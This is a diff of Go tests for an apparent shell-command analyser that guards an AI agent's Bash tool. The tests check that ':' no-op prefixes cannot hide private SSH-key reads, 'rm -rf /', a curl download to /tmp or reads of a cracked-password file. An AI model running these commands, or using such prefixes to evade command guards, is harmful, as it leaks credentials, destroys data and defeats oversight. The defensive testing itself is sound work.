@@ -30,6 +30,78 @@ func TestTrustedHomeTildeOperandsMakeALoneCommandExact(t *testing.T) {
 	}
 }
 
+func TestR103B07TrustedHomeInertListRead(t *testing.T) {
+	for _, command := range []string{
+		": ; cat ~/.ssh/id_ed25519",
+		":;cat ~/.ssh/id_ed25519",
+		": >marker; cat ~/.ssh/id_ed25519",
+		"{ :; }; cat ~/.ssh/id_ed25519",
+		"(:); cat ~/.ssh/id_ed25519",
+		": && cat ~/.ssh/id_ed25519",
+		":\ncat ~/.ssh/id_ed25519",
+		"cat ~/.ssh/id_ed25519; : >marker",
+	} {
+		t.Run(command, func(t *testing.T) {
+			facts := Analyze(Input{Tool: "Bash", Command: command, CWD: "/work/app", ActiveHome: "/sandbox", DialectHint: DialectPOSIX})
+			if !facts.Authoritative() || !facts.EnforcementEligible() {
+				t.Fatalf("%q parse=%+v commands=%+v", command, facts.Parse, facts.Commands)
+			}
+			found := false
+			for _, path := range facts.Paths {
+				if path.Access == PathAccessRead && path.Resolved == "/sandbox/.ssh/id_ed25519" {
+					found = true
+				}
+			}
+			if !found {
+				t.Fatalf("%q paths=%+v", command, facts.Paths)
+			}
+		})
+	}
+}
+
+func TestR103B07ColonRootDeleteFacts(t *testing.T) {
+	for _, command := range []string{":; rm -rf /", "{ :; }; rm -rf /", "(:); rm -rf /", ":\nrm -rf /", "rm -rf /; : >marker"} {
+		facts := Analyze(Input{Tool: "Bash", Command: command, CWD: "/work/app", ActiveHome: "/sandbox", DialectHint: DialectPOSIX})
+		if !facts.Authoritative() || !facts.EnforcementEligible() {
+			t.Errorf("%q parse=%+v commands=%+v", command, facts.Parse, facts.Commands)
+		}
+	}
+}
+
+// GAP-0651 normalizes only a bare ":" (or a group holding one): a "true"
+// prefix keeps its own analysis, so "true && ..." stays a conditional flow.
+func TestR103B35InertListNormalizesOnlyColonShapes(t *testing.T) {
+	for _, command := range []string{
+		"true; cat ~/.ssh/id_rsa",
+		"true && rm -rf /",
+		"true && curl http://8.8.8.8/runner -o /tmp/runner",
+		"true && cat /root/.john/john.pot",
+		"{ true; }; rm -rf /",
+		"(true); rm -rf /",
+		": x && rm -rf /",
+		": <input; rm -rf /",
+		": >$TARGET; rm -rf /",
+		"! :; rm -rf /",
+	} {
+		if got, _, ok := normalizeTrustedHomeInertListSource(command); ok {
+			t.Errorf("%q normalized to %q", command, got)
+		}
+	}
+	for _, test := range []struct{ command, want string }{
+		{": ; cat ~/.ssh/id_rsa", "true; cat ~/.ssh/id_rsa"},
+		{": >marker; cat ~/.ssh/id_rsa", "true >marker; cat ~/.ssh/id_rsa"},
+		{"{ :; }; rm -rf /", "true; rm -rf /"},
+		{"(:); rm -rf /", "true; rm -rf /"},
+		{": && rm -rf /", "true; rm -rf /"},
+		{"rm -rf /; : >>marker", "rm -rf /; true >>marker"},
+	} {
+		got, inert, ok := normalizeTrustedHomeInertListSource(test.command)
+		if !ok || got != test.want || len(inert) != 2 || inert[0] == inert[1] {
+			t.Errorf("%q normalized to %q %v %t, want %q", test.command, got, inert, ok, test.want)
+		}
+	}
+}
+
 func TestTrustedHomeTildeLeavesOtherShapesPartial(t *testing.T) {
 	for _, tc := range []struct {
 		name, command, home string
@@ -37,7 +109,15 @@ func TestTrustedHomeTildeLeavesOtherShapesPartial(t *testing.T) {
 		{"no active home", "cat ~/.ssh/id_rsa", ""},
 		{"home that is not a plain word", "cat ~/.ssh/id_rsa", "/home/a b"},
 		{"earlier command", "true; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"earlier echo", "echo x; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"true conditional", "true && cat ~/.ssh/id_rsa", "/sandbox"},
+		{"true group", "{ true; }; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"colon with an argument", ": x; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"colon input redirect", ": <input; cat ~/.ssh/id_rsa", "/sandbox"},
 		{"home changed first", "HOME=/tmp; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"colon then home change", ":; HOME=/tmp; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"colon dynamic redirect", ": >$TARGET; cat ~/.ssh/id_rsa", "/sandbox"},
+		{"noninert group", "{ echo x; }; cat ~/.ssh/id_rsa", "/sandbox"},
 		{"prefix assignment", "HOME=/tmp cat ~/.ssh/id_rsa", "/sandbox"},
 		{"other user", "cat ~alice/.ssh/id_rsa", "/sandbox"},
 		{"glob", "cat ~/.ssh/id_*", "/sandbox"},
